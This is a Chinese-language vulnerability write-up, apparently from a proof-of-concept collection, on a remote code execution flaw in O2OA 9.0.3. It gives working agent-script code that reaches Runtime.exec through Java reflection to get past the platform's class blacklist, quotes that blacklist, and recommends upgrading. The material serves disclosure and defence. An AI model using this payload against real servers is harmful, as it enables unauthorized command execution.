# O2OA 9.0.3 版本 scriptingBlockedClasses 绕过导致远程代码执行

## 漏洞描述

O2OA（翱途）低代码开发平台是一个开源企业协同办公定制平台，提供完整的前后端 API 和模块定制能力。

O2OA 9.0.3 版本存在远程代码执行漏洞，平台使用 `scriptingBlockedClasses` 属性值列表作为黑名单过滤器，攻击者可以通过 Java 反射绕过黑名单限制。

参考链接：

- https://github.com/o2oa/o2oa/issues/158
- https://github.com/o2oa/o2oa/issues/159
- https://www.o2oa.net/log/log.html

## 披露时间

2024-06-04

## 漏洞影响

```
O2OA 9.0.3
```

## 环境搭建

在 [官网下载](https://www.o2oa.net/download.html) 一个 9.0.3 版本，本地搭建测试：

```
unzip o2server-9.0.3-linux-x64.zip 
cd o2server
./start_linux.sh
```

按照提示进行安装，选择内置 `h2` 数据库：

![](images/O2OA%209.0.3%20版本%20scriptingBlockedClasses%20绕过导致远程代码执行/image-20250227115153709.png)

## 漏洞复现

以 `xadmin` 身份登录平台，点击 `Service Platform` 进入服务平台：

![](images/O2OA%209.0.3%20版本%20scriptingBlockedClasses%20绕过导致远程代码执行/image-20250227133946590.png)

点击 `Create Agent` 创建一个代理：

![](images/O2OA%209.0.3%20版本%20scriptingBlockedClasses%20绕过导致远程代码执行/image-20250227134017147.png)

填写 `Name`、`Alias` 和 `Time task cron expression` 等必填项，写入 [payload](https://github.com/o2oa/o2oa/issues/158) ：

```
var a = mainOutput(); 
function mainOutput() {
    var clazz = Java.type("java.lang.Class");
    var rt = clazz.forName("java.lang.Runtime");
    var stringClazz = Java.type("java.lang.String");

    var getRuntimeMethod = rt.getMethod("getRuntime");
    var execMethod = rt.getMethod("exec",stringClazz);
    var runtimeObject = getRuntimeMethod.invoke(rt);
    execMethod.invoke(runtimeObject,"touch /tmp/awesome_poc");
};
```

点击保存。关闭当前窗口，重新进入点击 `Run` 执行：

 ![](images/O2OA%209.0.3%20版本%20scriptingBlockedClasses%20绕过导致远程代码执行/image-20250227134123509.png)

命令成功执行：

![](images/O2OA%209.0.3%20版本%20scriptingBlockedClasses%20绕过导致远程代码执行/image-20250227134221784.png)

漏洞产生的原因是 9.0.3 版本 `o2server/configSample/general.json` 文件中对类做了黑名单限制，但是攻击者可以通过 Java 反射绕过黑名单中的类：

```
"scriptingBlockedClasses": [
	"java.util.zip.ZipOutputStream",
	"java.io.RandomAccessFile",
	"java.net.Socket",
	"java.util.zip.ZipInputStream",
	"java.nio.file.Files",
	"java.lang.System",
	"java.net.URL",
	"java.lang.Runtime",
	"java.io.FileWriter",
	"java.io.FileOutputStream",
	"javax.script.ScriptEngineManager",
	"java.io.File",
	"java.net.ServerSocket",
	"java.nio.file.Paths",
	"javax.script.ScriptEngine",
	"java.util.zip.ZipFile",
	"java.lang.ProcessBuilder",
	"java.net.URI",
	"java.nio.file.Path"
],
```

![](images/O2OA%209.0.3%20版本%20scriptingBlockedClasses%20绕过导致远程代码执行/image-20250227114843307.png)

## 漏洞修复

建议升级 O2OA 最新版本： https://www.o2oa.net/download.html
